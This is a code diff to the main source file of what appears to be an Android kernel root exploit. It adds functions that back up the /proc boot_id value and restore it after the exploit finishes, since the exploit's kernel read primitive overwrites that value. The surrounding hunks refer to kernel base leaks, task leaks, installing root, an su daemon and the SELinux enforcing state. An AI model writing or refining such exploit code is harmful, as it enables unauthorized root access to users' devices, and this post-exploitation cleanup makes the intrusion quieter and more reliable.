@@ -1,0 +1,109 @@
+diff --git a/payload/src/main.c b/payload/src/main.c
+index 93e75cf..a43cbc2 100644
+--- a/payload/src/main.c
++++ b/payload/src/main.c
+@@ -205,6 +205,85 @@ static int direct_read_boot_id_raw(unsigned char raw[16]) {
+   return 1;
+ }
+ 
++/*
++ * random_boot_id_data doubles as the read-back oracle of the shape0 read
++ * primitive: every direct read copies the leaked qword and the buffer address
++ * into it, destroying the boot UUID that libcutils concatenates onto
++ * "/dev/ashmem" to build the device path. Keep the original ASCII text so
++ * the exploit can write it back through the procfs sysctl handler once root
++ * is installed; the restore uses the normal sysctl write path and therefore
++ * no kernel write primitive at all.
++ */
++static char direct_boot_id_ascii[40];
++static size_t direct_boot_id_ascii_len;
++static unsigned char direct_boot_id_binary[16];
++
++static void direct_backup_boot_id_text(void) {
++  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
++  if (fd < 0) {
++    pr_warning("direct boot_id backup open failed errno=%d\n", errno);
++    return;
++  }
++  ssize_t n = read(fd, direct_boot_id_ascii,
++                   sizeof(direct_boot_id_ascii) - 1);
++  int saved_errno = errno;
++  close(fd);
++  if (n <= 0) {
++    pr_warning("direct boot_id backup read failed ret=%zd errno=%d\n",
++               n, saved_errno);
++    direct_boot_id_ascii[0] = 0;
++    return;
++  }
++  direct_boot_id_ascii[n] = 0;
++  /* Keep exactly the leading 36 hex chars; drop the trailing newline. */
++  size_t len = 0;
++  for (size_t i = 0; i < (size_t)n; i++) {
++    char c = direct_boot_id_ascii[i];
++    if (c == '\n' || c == '\r' || c == ' ' || c == '\t') {
++      break;
++    }
++    direct_boot_id_ascii[len++] = c;
++  }
++  direct_boot_id_ascii[len] = 0;
++  direct_boot_id_ascii_len = len;
++  if (!direct_read_boot_id_raw(direct_boot_id_binary)) {
++    pr_warning("direct boot_id backup parse failed text=%s\n",
++               direct_boot_id_ascii);
++    direct_boot_id_ascii_len = 0;
++    return;
++  }
++  pr_success("direct boot_id backup len=%zu text=%s\n",
++             direct_boot_id_ascii_len, direct_boot_id_ascii);
++}
++
++static void direct_restore_boot_id_text(void) {
++  if (!direct_boot_id_ascii_len) {
++    pr_warning("direct boot_id restore skipped: no backup\n");
++    return;
++  }
++  int fd = open("/proc/sys/kernel/random/boot_id", O_WRONLY | O_CLOEXEC);
++  if (fd < 0) {
++    pr_error("direct boot_id restore open failed errno=%d\n", errno);
++    return;
++  }
++  ssize_t n = write(fd, direct_boot_id_ascii, direct_boot_id_ascii_len);
++  int saved_errno = errno;
++  close(fd);
++  if (n != (ssize_t)direct_boot_id_ascii_len) {
++    pr_error("direct boot_id restore write failed ret=%zd errno=%d\n",
++             n, saved_errno);
++    return;
++  }
++  unsigned char verify[16];
++  int ok = direct_read_boot_id_raw(verify) &&
++           memcmp(verify, direct_boot_id_binary, 16) == 0;
++  if (ok) {
++    pr_success("direct boot_id restore written=%zd verified=1\n", n);
++  } else {
++    pr_error("direct boot_id restore written=%zd verified=0\n", n);
++  }
++}
++
+ enum direct_r64_result {
+   DIRECT_R64_FATAL = -1,
+   DIRECT_R64_RETRY = 0,
+@@ -591,6 +670,10 @@ static int run_direct_root_stage(void) {
+              root_ok, id_ok, su_ok, su_errno, su_daemon_pid,
+              enforcing, enforcing_after,
+              getuid(), geteuid(), getgid(), getegid());
++
++  /* Last shape0 oracle read already happened in the task-leak loop above;
++   * give the kernel its boot UUID back before this process exits. */
++  direct_restore_boot_id_text();
+   return root_ok;
+ }
+ 
+@@ -605,6 +688,7 @@ int run_exploit(int argc, char **argv) {
+     return 1;
+   }
+   log_startup_context();
++  direct_backup_boot_id_text();
+ 
+   pin_to_core(CORE);
+   if (!slide_leak_kernel_base()) {
